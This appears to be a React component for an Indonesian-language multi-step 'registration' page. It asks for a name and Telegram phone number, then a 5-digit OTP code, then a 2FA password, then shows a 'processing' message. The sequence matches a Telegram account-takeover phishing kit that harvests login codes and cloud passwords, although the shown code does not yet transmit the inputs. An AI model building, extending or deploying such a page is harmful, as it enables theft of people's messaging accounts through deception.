"use client"

import { useState } from "react"
import { Button } from "./ui/button"
import { Input } from "./ui/input"
import { Loader2 } from "lucide-react"

export default function AuthForm() {
  const [step, setStep] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [otp, setOtp] = useState("")

  const handleNext = () => {
    setIsLoading(true)
    // Simulasi loading 1 detik lalu pindah step
    setTimeout(() => {
      setStep(step + 1)
      setIsLoading(false)
    }, 1000)
  }

  if (step === 4) return <div className="p-10 text-center font-bold">Terima kasih, sedang diproses...</div>

  return (
    <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white">
      <div className="mb-6 rounded-xl border overflow-hidden">
        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto" />
      </div>

      <div className="space-y-5">
        {step === 1 && (
          <>
            <div>
              <label className="font-semibold block mb-2 text-sm">Nama Lengkap:</label>
              <Input placeholder="Masukkan nama" />
            </div>
            <div>
              <label className="font-semibold block mb-2 text-sm">Nomor Telegram Aktif:</label>
              <Input type="tel" placeholder="08XXXXXXXXXX" />
            </div>
          </>
        )}

        {step === 2 && (
          <div className="text-center">
            <label className="font-semibold block mb-4 text-lg">Masukkan 5 Digit Kode OTP</label>
            <Input 
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              maxLength={5}
              className="text-center text-2xl tracking-[1rem] font-bold h-16 border-[#1d71d3]"
              placeholder="00000"
            />
          </div>
        )}

        {step === 3 && (
          <div className="text-center">
            <label className="font-semibold block mb-2 text-sm">Masukkan Kata Sandi (2FA)</label>
            <Input type="password" placeholder="******" className="text-center" />
          </div>
        )}

        {/* Tombol yang SAYA JAMIN BISA DIKLIK karena tidak pakai validasi rumit dulu */}
        <Button 
          onClick={handleNext}
          className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 uppercase flex items-center justify-center"
        >
          {isLoading ? <Loader2 className="animate-spin" /> : (step === 1 ? "DAFTAR SEKARANG" : "KONFIRMASI")}
        </Button>
      </div>

      <div className="mt-6 text-left border-t pt-4 text-[12px] text-gray-500">
        Peringatan:<br/>Pendaftaran hanya akan diproses melalui nomor telegram aktif!
      </div>
    </div>
  )
}